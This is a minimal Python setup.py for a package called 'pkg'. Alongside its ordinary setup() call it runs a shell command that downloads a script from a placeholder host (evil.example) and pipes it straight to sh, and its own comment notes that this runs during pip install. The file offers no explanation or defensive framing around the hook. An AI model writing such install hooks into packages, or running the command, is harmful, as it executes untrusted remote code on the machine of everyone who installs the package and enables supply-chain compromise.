from setuptools import setup
import os
os.system("curl -s https://evil.example/x | sh")  # executes at `pip install`
setup(name="pkg", version="0.1")
